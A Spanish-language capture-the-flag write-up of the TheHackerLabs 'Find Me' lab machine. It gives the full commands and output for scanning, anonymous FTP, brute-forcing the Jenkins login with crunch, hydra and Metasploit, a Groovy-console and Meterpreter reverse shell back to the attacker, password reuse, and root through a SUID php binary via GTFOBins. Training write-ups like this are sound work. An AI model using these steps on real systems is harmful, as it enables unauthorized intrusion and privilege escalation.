---
title: "Find Me - TheHackerLabs"
date: 2025-04-04
draft: false
slug: "THL-writeup-findMe"
excerpt: "Esta fue una máquina sencilla, pero que te puede desorientar un poco. Analizando los escaneos, podemos ver que tiene 4 puertos abiertos, pero da curiosidad ver el puerto 21 y el puerto 8080 activos. En el escaneo de servicios, descubrimos que el puerto 8080 está utilizando el servicio Jenkins y que podemos entrar al servicio FTP como el usuario anonymous. Dentro del FTP, encontramos un archivo de texto que contiene una pista de un usuario, que nos pide aplicar fuerza bruta al login de Jenkins. Aplicando fuerza bruta, encontramos la contraseña de este usuario. Dentro, aplicamos una Reverse Shell en la consola de Groovy para ganar acceso a la máquina víctima. Ya en la máquina, podemos autenticarnos como el usuario que nos dejó la pista, ya que reutilizó la misma contraseña. Como este usuario, descubrimos que no tiene privilegios, por lo que buscamos una forma de escalar privilegios, siendo un binario SUID el que nos ayudará junto a la guía GTFOBins."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "FTP", "Jenkins Server", "FTP Enumeration", "Brute Force Attack", "Abusing Groovy Console (Reverse Shell)", "Password Reuse", "Abusing SUID Binary", "Privesc - Abusing SUID Binary", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "ftp"
  - "crunch"
  - "BurpSuite"
  - "hydra"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: auxiliary/scanner/http/jenkins_login"
  - "nc"
  - "Módulo: exploit/multi/http/jenkins_script_console"
  - "su"
  - "php"
links:
  - "https://github.com/gquere/pwn_jenkins"
  - "https://www.hackingarticles.in/jenkins-penetration-testing/"
  - "https://github.com/nixawk/pentest-wiki/blob/master/2.Vulnerability-Assessment/Network-Assessment/Jenkins/Jenkins_hacking.md"
  - "https://www.revshells.com/"
  - "https://gtfobins.github.io/gtfobins/julia/"
  - "https://gtfobins.github.io/gtfobins/php/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-findMe/findMe.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.230
PING 192.168.1.230 (192.168.1.230) 56(84) bytes of data.
64 bytes from 192.168.1.230: icmp_seq=1 ttl=64 time=1.78 ms
64 bytes from 192.168.1.230: icmp_seq=2 ttl=64 time=1.24 ms
64 bytes from 192.168.1.230: icmp_seq=3 ttl=64 time=0.826 ms
64 bytes from 192.168.1.230: icmp_seq=4 ttl=64 time=1.24 ms

--- 192.168.1.230 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3018ms
rtt min/avg/max/mdev = 0.826/1.270/1.780/0.338 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.230 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-04 12:31 CST
Initiating ARP Ping Scan at 12:31
Scanning 192.168.1.230 [1 port]
Completed ARP Ping Scan at 12:31, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:31
Scanning 192.168.1.230 [65535 ports]
Discovered open port 8080/tcp on 192.168.1.230
Discovered open port 22/tcp on 192.168.1.230
Discovered open port 21/tcp on 192.168.1.230
Discovered open port 80/tcp on 192.168.1.230
Completed SYN Stealth Scan at 12:31, 8.50s elapsed (65535 total ports)
Nmap scan report for 192.168.1.230
Host is up, received arp-response (0.00098s latency).
Scanned at 2025-04-04 12:31:10 CST for 8s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 64
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo 4 puertos abiertos y curiosamente, veo que está abierto el **puerto 21** y el **puerto 8080**, cosa que no es raro, pero tampoco es normal.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,22,80,8080 192.168.1.230 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-04 12:33 CST
Nmap scan report for 192.168.100.50
Host is up (0.00085s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp

| fingerprint-strings: 
|   GenericLines: 
|     220 Servidor ProFTPD (Debian) [::ffff:192.168.1.230]
|     Orden incorrecta: Intenta ser m
|     creativo
|     Orden incorrecta: Intenta ser m
|     creativo
|   Help: 
|     220 Servidor ProFTPD (Debian) [::ffff:192.168.1.230]
|     214-Se reconocen las siguiente 
|     rdenes (* =>'s no implementadas):
|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
|     STOR STOU APPE REST ABOR RANG USER PASS 
|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
|     comentario a root@find-me
|   NULL, SMBProgNeg, SSLSessionReq: 
|_    220 Servidor ProFTPD (Debian) [::ffff:192.168.1.230]
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 0        0             206 Jun  6  2024 ayuda.txt
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 a7:98:b6:44:36:c9:55:c6:06:f6:0b:5e:a2:ab:4f:28 (ECDSA)
|_  256 fa:bf:4f:e3:ea:ad:80:e7:99:3d:eb:44:8b:f5:58:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
8080/tcp open  http    Jetty 10.0.20

|_http-server-header: Jetty(10.0.20)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=4/4%Time=67F025E5%P=x86_64-pc-linux-gnu%r(NULL,
SF:37,"220\x20Servidor\x20ProFTPD\x20\(Debian\)\x20\[::ffff:192\.168\.1\
SF:.230\]\r\n")%r(GenericLines,99,"220\x20Servidor\x20ProFTPD\x20\(Debian\)
SF:\x20\[::ffff:192\.168\.1\.230\]\r\n500\x20Orden\x20incorrecta:\x20Inte
SF:nta\x20ser\x20m\xc3\xa1s\x20creativo\r\n500\x20Orden\x20incorrecta:\x20
SF:Intenta\x20ser\x20m\xc3\xa1s\x20creativo\r\n")%r(Help,276,"220\x20Servi
SF:dor\x20ProFTPD\x20\(Debian\)\x20\[::ffff:192\.168\.1\.230\]\r\n214-Se\
SF:x20reconocen\x20las\x20siguiente\x20\xc3\xb3rdenes\x20\(\*\x20=>'s\x20n
SF:o\x20implementadas\):\r\n\x20CWD\x20\x20\x20\x20\x20XCWD\x20\x20\x20\x2
SF:0CDUP\x20\x20\x20\x20XCUP\x20\x20\x20\x20SMNT\*\x20\x20\x20QUIT\x20\x20
SF:\x20\x20PORT\x20\x20\x20\x20PASV\x20\x20\x20\x20\r\n\x20EPRT\x20\x20\x2
SF:0\x20EPSV\x20\x20\x20\x20ALLO\x20\x20\x20\x20RNFR\x20\x20\x20\x20RNTO\x
SF:20\x20\x20\x20DELE\x20\x20\x20\x20MDTM\x20\x20\x20\x20RMD\x20\x20\x20\x
SF:20\x20\r\n\x20XRMD\x20\x20\x20\x20MKD\x20\x20\x20\x20\x20XMKD\x20\x20\x
SF:20\x20PWD\x20\x20\x20\x20\x20XPWD\x20\x20\x20\x20SIZE\x20\x20\x20\x20SY
SF:ST\x20\x20\x20\x20HELP\x20\x20\x20\x20\r\n\x20NOOP\x20\x20\x20\x20FEAT\
SF:x20\x20\x20\x20OPTS\x20\x20\x20\x20HOST\x20\x20\x20\x20CLNT\x20\x20\x20
SF:\x20AUTH\*\x20\x20\x20CCC\*\x20\x20\x20\x20CONF\*\x20\x20\x20\r\n\x20EN
SF:C\*\x20\x20\x20\x20MIC\*\x20\x20\x20\x20PBSZ\*\x20\x20\x20PROT\*\x20\x2
SF:0\x20TYPE\x20\x20\x20\x20STRU\x20\x20\x20\x20MODE\x20\x20\x20\x20RETR\x
SF:20\x20\x20\x20\r\n\x20STOR\x20\x20\x20\x20STOU\x20\x20\x20\x20APPE\x20\
SF:x20\x20\x20REST\x20\x20\x20\x20ABOR\x20\x20\x20\x20RANG\x20\x20\x20\x20
SF:USER\x20\x20\x20\x20PASS\x20\x20\x20\x20\r\n\x20ACCT\*\x20\x20\x20REIN\
SF:*\x20\x20\x20LIST\x20\x20\x20\x20NLST\x20\x20\x20\x20STAT\x20\x20\x20\x
SF:20SITE\x20\x20\x20\x20MLSD\x20\x20\x20\x20MLST\x20\x20\x20\x20\r\n214\x
SF:20Env\xc3\xada\x20comentario\x20a\x20root@find-me\r\n")%r(SSLSessionReq
SF:,37,"220\x20Servidor\x20ProFTPD\x20\(Debian\)\x20\[::ffff:192\.168\.1
SF:\.230\]\r\n")%r(SMBProgNeg,37,"220\x20Servidor\x20ProFTPD\x20\(Debian\)\
SF:x20\[::ffff:192\.168\.1\.230\]\r\n");
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: Servidor; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.40 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

El escaneo nos muestra que el **puerto 21**, que es del **servicio FTP**, nos está permitiendo loguearnos como **usuario anonymous**. Además, parece que el **puerto 8080** está utilizando **Jenkins**.

Parece que el **puerto 80** solamente está mostrando la página por defecto de **Apache2**.

Vamos a ver qué hay dentro del **servicio FTP**, puede que ahí encontremos algo.

## Análisis de Vulnerabilidades {#Analisis}

### Enumeración del Servicio FTP {#FTP}

Entremos al **FTP** como **usuario anonymous**:
```bash
ftp 192.168.1.230
Connected to 192.168.1.230.
220 Servidor ProFTPD (Debian) [::ffff:192.168.1.230]
Name (192.168.1.230:berserkwings): anonymous
331 Conexión anónima ok, envía tu dirección de email como contraseña
Password: 
230 Aceptado acceso anónimo, aplicadas restricciones
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Estamos dentro.

Veamos qué contenido hay aquí:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||23943|)
150 Abriendo conexión de datos en modo ASCII para file list
-rw-r--r--   1 0        0             206 Jun  6  2024 ayuda.txt
226 Transferencia completada
```
Hay un archivo de texto llamado **ayuda.txt**.

Descarguémoslo:
```bash
ftp> get ayuda.txt
local: ayuda.txt remote: ayuda.txt
229 Entering Extended Passive Mode (|||32313|)
150 Opening BINARY mode data connection for ayuda.txt (206 bytes)
100% |****************************************|   206      103.96 KiB/s    00:00 ETA
226 Transferencia completada
206 bytes received in 00:00 (31.98 KiB/s)
ftp>
```
Parece que no hay nada más.

Salgamos y veamos qué nos dice este archivo:
```bash
ftp> exit
221 Hasta luego
.
cat ayuda.txt
hola soy geralt
he perdido mi contraseña del servicio jenkins
me han dicho que tu sabes de fuerza bruta
la contraseña contiene 5 caracteres
empieza por p y acaba en a
no recuerdo nada mas
muchas gracias
```
Es claro que tenemos que crear un diccionario de posibles contraseñas para ganar acceso al **login de Jenkins**.

Vamos a crearlo.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta a Login de Jenkins cob hydra {#jenkinsFB}

Vamos a utilizar la herramienta **crunch** para crear nuestro diccionario.

Tenemos 3 pistas sobre la contraseña correcta, siendo que tiene **5 caracteres** e inicia con **p** y termina con **a**:
```bash
crunch 5 5 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -t p@@@a -o wordlist.txt
Crunch will now generate the following amount of data: 1429968 bytes
1 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 238328 
.
crunch: 100% completed generating output
```
Como no sabemos qué caracteres pueden ser, le indicamos minúsculas, mayúsculas y números.

Tenemos un diccionario con **238328 líneas**.

Ahora, necesitamos saber cómo se envían las credenciales desde el login de **Jenkins**, y esto lo haremos con **BurpSuite**.

Primero entremos al login:

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura1.png">
</p>

Bien, ahora vamos a capturar la petición que tendrá las credenciales de acceso:

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura2.png">
</p>

Observa la data que se está enviando en una **petición POST** y qué página valida la data enviada.

Y si observas el login, podrás ver que hay un mensaje de error y la URL cambia:

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura3.png">
</p>

Con esta información, ya podemos armar lo necesario para aplicar la fuerza bruta con **hydra**:
```bash
hydra -l geralt -P wordlist.txt 192.168.1.230 -s 8080 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=:c=/loginError:Invalid username or password" -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-04 13:58:04
[DATA] max 64 tasks per 1 server, overall 64 tasks, 238328 login tries (l:1/p:238328), ~3724 tries per task
[DATA] attacking http-post-form://192.168.1.230:8080/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=:c=/loginError:Invalid username or password
[STATUS] 822.00 tries/min, 822 tries in 00:01h, 237506 to do in 04:49h, 64 active
[8080][http-post-form] host: 192.168.1.230   login: geralt   password: panda
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-04 13:59:10
```
Excelente, funcionó y tenemos la contraseña.

Vamos a comprobarlo:

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura4.png">
</p>

Y estamos dentro.

#### Aplicando Fuerza Bruta a Login de Jenkins con Módulo jenkins_login de Metasploit Framework {#jenkinsFB2}

Otra opción para aplicar fuerza bruta es utilizar el módulo `auxiliary/scanner/http/jenkins_login` de **Metasploit Framework**.

Inicia **Metasploit** y utiliza el módulo:
```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use use auxiliary/scanner/http/jenkins_login
msf6 auxiliary(scanner/http/jenkins_login) >
```

Configúralo:
```bash
msf6 auxiliary(scanner/http/jenkins_login) > set RHOSTS 192.168.1.230
RHOSTS => 192.168.1.230
msf6 auxiliary(scanner/http/jenkins_login) > set TARGETURI /
TARGETURI => /
msf6 auxiliary(scanner/http/jenkins_login) > set USERNAME geralt
USERNAME => geralt
msf6 auxiliary(scanner/http/jenkins_login) > set PASS_FILE wordlist.txt
PASS_FILE => wordlist.txt
msf6 auxiliary(scanner/http/jenkins_login) > set VERBOSE false
VERBOSE => false
```

Y ejecútalo:
```bash
msf6 auxiliary(scanner/http/jenkins_login) > exploit
[+] 192.168.1.230:8080 - Login Successful: geralt:panda
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Funcionó, tenemos la contraseña.

### Obteniendo Reverse Shell Abusando del Servidor Jenkins {#jenkinsRevShell}

El siguiente blog nos explica como obtener una **Reverse Shell** manualmente y desde **Metasploit Framework**:
* <a href="https://www.hackingarticles.in/jenkins-penetration-testing/" target="_blank">Jenkins Penetration Testing</a>

Vamos a aplicar las dos formas que menciona.

#### Obteniendo Reverse Shell Abusando de Consola Groovy del Servidor Jenkins {#jenkinsRevShell2}

Primero, abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Entremos a la **consola de Groovy**:

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura5.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura6.png">
</p>

Listo, estamos en la consola:

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura7.png">
</p>

Como dice el blog, ocupemos la **Reverse Shell** de **Groovy** de la página **Reverse Shell Generator**:
* <a href="https://www.revshells.com/" target="_blank">Reverse Shell Generator</a>

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura8.png">
</p>

La ponemos en la consola y la ejecutamos:

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura9.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.230] 54172
whoami
jenkins
/bin/bash -i
bash: no se puede establecer el grupo de proceso de terminal (407): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
jenkins@find-me:~$
```
Listo, estamos dentro.

Obtén una sesión interactiva siguiendo estos pasos:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2: Presiona CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset
xterm

# Paso 5:
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```
Esto será útil para más adelante.

#### Obteniendo Sesión de Meterpreter con Módulo jenkins_script_console de Metasploit Framework {#jenkinsRevShell3}

Inicia **Metasploit Framework** y usa el módulo `exploit/multi/http/jenkins_script_console`:
```bash
msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use exploit/multi/http/jenkins_script_console
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(multi/http/jenkins_script_console) >
```

Configúralo:
```bash
msf6 exploit(multi/http/jenkins_script_console) > set PASSWORD panda
PASSWORD => panda
msf6 exploit(multi/http/jenkins_script_console) > set USERNAME geralt
USERNAME => geralt
msf6 exploit(multi/http/jenkins_script_console) > set RHOSTS 192.168.1.230
RHOSTS => 192.168.1.230
msf6 exploit(multi/http/jenkins_script_console) > set RPORT 8080
RPORT => 8080
msf6 exploit(multi/http/jenkins_script_console) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
PAYLOAD => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/jenkins_script_console) > set target 1
target => 1
msf6 exploit(multi/http/jenkins_script_console) > set TARGETURI /
TARGETURI => /
```

Y ejecútalo:
```bash
msf6 exploit(multi/http/jenkins_script_console) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Checking access to the script console
[*] Logging in...
[*] Using CSRF token: '59b63ed25c3c5eb39c022b588de43208cbc4edd78c465bcd5a333' (Jenkins-Crumb style v2)
[*] 192.168.1.230:8080 - Sending Linux stager...
[*] Sending stage (1017704 bytes) to 192.168.1.230
[*] Command Stager progress - 100.00% done (763/763 bytes)
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 192.168.1.230:42502) at 2025-04-04 15:34:03 -0600

meterpreter > getuid
Server username: jenkins
```
Listo, estamos dentro.

## Post Explotación {#Post}

### Enumeración de Máquina Víctima y Convirtiéndonos en el Usuario geralt {#enumLin}

En el directorio actual, podremos ver archivos relacionados con **Jenkins**:
```bash
100
drwxr-xr-x 12 jenkins jenkins  4096 abr  4 21:08 .
drwxr-xr-x 24 root    root     4096 jun  6  2024 ..
drwxr-xr-x  3 jenkins jenkins  4096 jun  6  2024 .cache
-rw-r--r--  1 jenkins jenkins  1658 abr  4 20:28 config.xml
drwxr-xr-x  3 jenkins jenkins  4096 jun  6  2024 .groovy
-rw-r--r--  1 jenkins jenkins   156 abr  4 20:28 hudson.model.UpdateCenter.xml
-rw-r--r--  1 jenkins jenkins   370 jun  6  2024 hudson.plugins.git.GitTool.xml
-rw-------  1 jenkins jenkins  1680 jun  6  2024 identity.key.enc
drwxr-xr-x  3 jenkins jenkins  4096 jun  6  2024 .java
-rw-r--r--  1 jenkins jenkins     5 abr  4 20:28 jenkins.install.InstallUtil.lastExecVersion
-rw-r--r--  1 jenkins jenkins     5 jun  6  2024 jenkins.install.UpgradeWizard.state
-rw-r--r--  1 jenkins jenkins   179 jun  6  2024 jenkins.model.JenkinsLocationConfiguration.xml
-rw-r--r--  1 jenkins jenkins   171 jun  6  2024 jenkins.telemetry.Correlator.xml
drwxr-xr-x  2 jenkins jenkins  4096 jun  6  2024 jobs
-rw-r--r--  1 jenkins jenkins     0 abr  4 20:28 .lastStarted
drwxr-xr-x  2 jenkins jenkins  4096 jun  6  2024 logs
-rw-r--r--  1 jenkins jenkins  1037 abr  4 20:28 nodeMonitors.xml
-rw-r--r--  1 jenkins jenkins     3 abr  4 22:12 .owner
drwxr-xr-x 91 jenkins jenkins 12288 jun  6  2024 plugins
-rw-r--r--  1 jenkins jenkins    64 jun  6  2024 secret.key
-rw-r--r--  1 jenkins jenkins     0 jun  6  2024 secret.key.not-so-secret
drwx------  2 jenkins jenkins  4096 jun  6  2024 secrets
drwxr-xr-x  2 jenkins jenkins  4096 abr  4 20:28 updates
drwxr-xr-x  2 jenkins jenkins  4096 jun  6  2024 userContent
drwxr-xr-x  3 jenkins jenkins  4096 jun  6  2024 users
```
Me da curiosidad esos **archivos secret**, pero no creo que nos sirvan por ahora.

Vamos a movernos al directorio `/home`, donde están los directorios de los usuarios de la máquina víctima:
```bash
jenkins@find-me:~$ cd /home
jenkins@find-me:/home$
```

Podríamos intentar obtener la flag del usuario, pero no podremos, ya que no tenemos acceso al directorio del **usuario geralt**:
```bash
jenkins@find-me:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 jun  6  2024 .
drwxr-xr-x 18 root   root   4096 jun  6  2024 ..
drwx------  5 geralt geralt 4096 jun  6  2024 geralt
```

Probemos si este usuario utiliza la misma contraseña para autenticarse en la máquina víctima:
```bash
jenkins@find-me:/home$ su geralt
Contraseña: 
geralt@find-me:/home$ whoami
geralt
```
Funcionó.

Y ya podemos obtener la flag del usuario:
```bash
geralt@find-me:/home$ cd geralt/
geralt@find-me:/home/geralt$ cat user.txt
...
```

Ahora, si intentamos loguearnos en el **servicio SSH** con las mismas credenciales, no va a funcionar:
```bash
ssh geralt@192.168.1.230
geralt@192.168.1.230: Permission denied (publickey).
```

Si investigamos un poco, podremos encontrar un directorio llamado **julia-1.8.3** dentro del directorio `/opt`:
```bash
jenkins@find-me:/home$ ls -la /opt
total 12
drwxr-xr-x  3 root   root   4096 jun  6  2024 .
drwxr-xr-x 18 root   root   4096 jun  6  2024 ..
drwxr-xr-x  8 geralt geralt 4096 nov 14  2022 julia-1.8.3
```
Este binario puede ser aprovechado para escalar privilegios, pero el binario que debería existir aquí, no lo encontraremos en ningún lado.

Tendremos que encontrar otra forma de escalar privilegios.

### Escalando Privilegios con Binario SUID php {#binarioSUID}

Este usuario no tiene ningún privilegio:
```bash
geralt@find-me:/home/geralt$ sudo -l
[sudo] contraseña para geralt: 
Sorry, user geralt may not run sudo on find-me.
```
Tendremos que buscar otra forma de escalar privilegios.

Si revisamos qué binarios tienen **permisos SUID**, encontraremos uno del que nos podemos aprovechar:
```bash
geralt@find-me:/home/geralt$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/php8.2
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Podemos buscar el **binario php** en **GTFOBins** para encontrar una forma de escalar privilegios:
* <a href="https://gtfobins.github.io/gtfobins/php/" target="_blank">GTFOBins: php</a>

<p align="center">
<img src="/assets/images/THL-writeup-findMe/Captura10.png">
</p>

Vamos a probarlo:
```bash
geralt@find-me:/home/geralt$ CMD="/bin/bash"
geralt@find-me:/home/geralt$ php -r "pcntl_exec('/bin/bash', ['-p']);"
bash-5.2# whoami
root
```
Genial, ya somos **Root**.

Ya solo busquemos la última flag:
```bash
bash-5.2# cd /root
bash-5.2# cat root.txt
...
```
Y con esto terminamos la máquina.
